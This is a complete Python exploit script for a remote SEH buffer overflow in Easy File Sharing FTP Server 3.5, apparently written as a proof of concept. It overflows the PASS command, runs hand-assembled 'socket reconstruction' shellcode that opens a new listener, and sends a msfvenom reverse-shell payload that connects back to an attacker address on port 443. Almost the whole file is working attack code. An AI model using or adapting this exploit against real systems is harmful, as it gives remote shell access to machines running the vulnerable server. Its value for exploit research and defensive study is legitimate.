#!/usr/bin/env python
# Author: Xavi Beltran
# Date: 17/08/2019
# Description:
#           Easy File Sharing FTP Server 3.5
#           Remote Buffer Overflow
#	    Socket Reconstruction Technique

# Contact: xavibeltran@protonmail.com
# Webpage: https://xavibel.com
# Tested on: Windows 7
import socket
import sys
from time import sleep

host = "192.168.1.99"
port = 21

con  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	print "[+]connecting to host..."
	con.connect((host,port))
	print con.recv(1024)
except:
	print "could not connect to the host"

user = "USER anonymous"+"\r\n"
con.send(user)
print con.recv(1024)

# POP-POP-RET 10017F21 SSLEAY32.DLL
seh = "\x21\x7F\x01\x10"

# JMP 0F
nseh = "\xEB\x0F\x90\x90"

# 0045629E   $-FF25 9CE74700  JMP DWORD PTR DS:[<&WSOCK32.#23>]        ;  WS2_32.socket
# 004562A4   $-FF25 A0E74700  JMP DWORD PTR DS:[<&WSOCK32.#2>]         ;  WS2_32.bind
# 00456286   $-FF25 8CE74700  JMP DWORD PTR DS:[<&WSOCK32.#13>]        ;  WS2_32.listen
# 004562F8   $-FF25 48E74700  JMP DWORD PTR DS:[<&WSOCK32.#1>]         ;  WS2_32.accept
# 00456274   $-FF25 80E74700  JMP DWORD PTR DS:[<&WSOCK32.#16>]        ;  WSOCK32.recv

socket_reconstruction = ""

# socket - socket(2,1,6) - 19 bytes
socket_reconstruction += "\xB0\x06"             # MOV AL,6
socket_reconstruction += "\x50"                 # PUSH EAX
socket_reconstruction += "\xB0\x01"             # MOV AL,1
socket_reconstruction += "\x50"                 # PUSH EAX
socket_reconstruction += "\xB0\x02"             # MOV AL,2
socket_reconstruction += "\x50"                 # PUSH EAX
socket_reconstruction += "\xBB\x88\x9E\x62\x45" # MOV EBX,45629E88
socket_reconstruction += "\xC1\xEB\x08"         # SHR EBX,8
socket_reconstruction += "\xFF\xD3"             # CALL EBX ; WS2_32.socket

# bind - bind(socket handle,socket addr struct,10)
socket_reconstruction += "\x8B\xF8"	        # MOV EDI,EAX ; store socket handle
socket_reconstruction += "\x33\xC0"             # XOR EAX, EAX
socket_reconstruction += "\x50"                 # PUSH EAX
socket_reconstruction += "\x50"                 # PUSH EAX
socket_reconstruction += "\x54"                 # PUSH ESP  
socket_reconstruction += "\x59" 		# POP ECX
socket_reconstruction += "\xC6\x01\x02" 	# MOV BYTE PTR DS:[ECX],2
socket_reconstruction += "\xC6\x41\x03\x16"	# MOV BYTE PTR DS:[ECX +3],16 # listen on port 22
socket_reconstruction += "\x6A\x16" 		# PUSH 16
socket_reconstruction += "\x51"  		# PUSH ECX
socket_reconstruction += "\x57"  		# PUSH EDI
socket_reconstruction += "\x66\xBB\xA4\x62" 	# MOV BX,62A4
socket_reconstruction += "\xFF\xD3"		# CALL EBX ; WS2_32.bind

# listen
socket_reconstruction += "\x66\xBB\x86\x62"     # MOV BX,6286
socket_reconstruction += "\x6A\x7F"		# PUSH 7F
socket_reconstruction += "\x57"			# PUSH EDI
socket_reconstruction += "\xFF\xD3"	        # CALL EBX


# accept - accept(socket, NULL, NULL)
socket_reconstruction += "\x33\xC0"    		# XOR EAX, EAX
socket_reconstruction += "\x50"     		# PUSH EAX
socket_reconstruction += "\x50"     		# PUSH EAX
socket_reconstruction += "\x66\xBB\xF8\x62"     # MOV BX,62F8
socket_reconstruction += "\x57"     		# PUSH EDI
socket_reconstruction += "\xFF\xD3"	        # CALL EBX

# recv
socket_reconstruction += "\x8B\xF8"	      	# MOV EDI,EAX ; store accept handle
socket_reconstruction += "\x33\xD2" 		# XOR EDX,EDX
socket_reconstruction += "\x52"   		# PUSH EDX
socket_reconstruction += "\xB6\x02"   		# MOV DH,2
socket_reconstruction += "\x52"			# PUSH EDX
socket_reconstruction += "\x54"			# PUSH ESP
socket_reconstruction += "\x59"			# POP ECX
socket_reconstruction += "\x66\x81\xC1\xEB\x10" # ADD CX,10EB ; Important value, where we are going to write the new socket data
socket_reconstruction += "\x51"			# PUSH ECX
socket_reconstruction += "\xB3\x74"		# MOV BL,74
socket_reconstruction += "\x57"			# PUSH EDI
socket_reconstruction += "\xFF\xD3"             # CALL EBX

socket_reconstruction += "\x90" * 20


# msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=192.168.1.88 EXITFUNC=thread -b "\x00" -f python -v shellcode
# Payload size: 351 bytes
shellcode =  ""
shellcode += "\xb8\xcd\x9a\xf3\x0b\xda\xcc\xd9\x74\x24\xf4\x5a"
shellcode += "\x31\xc9\xb1\x52\x31\x42\x12\x03\x42\x12\x83\x0f"
shellcode += "\x9e\x11\xfe\x73\x77\x57\x01\x8b\x88\x38\x8b\x6e"
shellcode += "\xb9\x78\xef\xfb\xea\x48\x7b\xa9\x06\x22\x29\x59"
shellcode += "\x9c\x46\xe6\x6e\x15\xec\xd0\x41\xa6\x5d\x20\xc0"
shellcode += "\x24\x9c\x75\x22\x14\x6f\x88\x23\x51\x92\x61\x71"
shellcode += "\x0a\xd8\xd4\x65\x3f\x94\xe4\x0e\x73\x38\x6d\xf3"
shellcode += "\xc4\x3b\x5c\xa2\x5f\x62\x7e\x45\xb3\x1e\x37\x5d"
shellcode += "\xd0\x1b\x81\xd6\x22\xd7\x10\x3e\x7b\x18\xbe\x7f"
shellcode += "\xb3\xeb\xbe\xb8\x74\x14\xb5\xb0\x86\xa9\xce\x07"
shellcode += "\xf4\x75\x5a\x93\x5e\xfd\xfc\x7f\x5e\xd2\x9b\xf4"
shellcode += "\x6c\x9f\xe8\x52\x71\x1e\x3c\xe9\x8d\xab\xc3\x3d"
shellcode += "\x04\xef\xe7\x99\x4c\xab\x86\xb8\x28\x1a\xb6\xda"
shellcode += "\x92\xc3\x12\x91\x3f\x17\x2f\xf8\x57\xd4\x02\x02"
shellcode += "\xa8\x72\x14\x71\x9a\xdd\x8e\x1d\x96\x96\x08\xda"
shellcode += "\xd9\x8c\xed\x74\x24\x2f\x0e\x5d\xe3\x7b\x5e\xf5"
shellcode += "\xc2\x03\x35\x05\xea\xd1\x9a\x55\x44\x8a\x5a\x05"
shellcode += "\x24\x7a\x33\x4f\xab\xa5\x23\x70\x61\xce\xce\x8b"
shellcode += "\xe2\x31\xa6\x92\xaa\xd9\xb5\x94\x4b\xa1\x33\x72"
shellcode += "\x21\xc5\x15\x2d\xde\x7c\x3c\xa5\x7f\x80\xea\xc0"
shellcode += "\x40\x0a\x19\x35\x0e\xfb\x54\x25\xe7\x0b\x23\x17"
shellcode += "\xae\x14\x99\x3f\x2c\x86\x46\xbf\x3b\xbb\xd0\xe8"
shellcode += "\x6c\x0d\x29\x7c\x81\x34\x83\x62\x58\xa0\xec\x26"
shellcode += "\x87\x11\xf2\xa7\x4a\x2d\xd0\xb7\x92\xae\x5c\xe3"
shellcode += "\x4a\xf9\x0a\x5d\x2d\x53\xfd\x37\xe7\x08\x57\xdf"
shellcode += "\x7e\x63\x68\x99\x7e\xae\x1e\x45\xce\x07\x67\x7a"
shellcode += "\xff\xcf\x6f\x03\x1d\x70\x8f\xde\xa5\x90\x72\xca"
shellcode += "\xd3\x38\x2b\x9f\x59\x25\xcc\x4a\x9d\x50\x4f\x7e"
shellcode += "\x5e\xa7\x4f\x0b\x5b\xe3\xd7\xe0\x11\x7c\xb2\x06"
shellcode += "\x85\x7d\x97"


crash ="PASS " + "\x2c" + "A"*2559 + nseh + seh + "\x90"*9  + socket_reconstruction + "\x90"*40 +"\r\n"


print "[+] Stage 1...\n"
con.send(crash)

#raw_input("Press Enter to continue...")
sleep(2)

print "[+] Stage 2...\n"

con2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
con2.connect((host,22))

con2.send("\x90" * 30 + shellcode + "\xCC" * 20)

con2.close()
con.close()
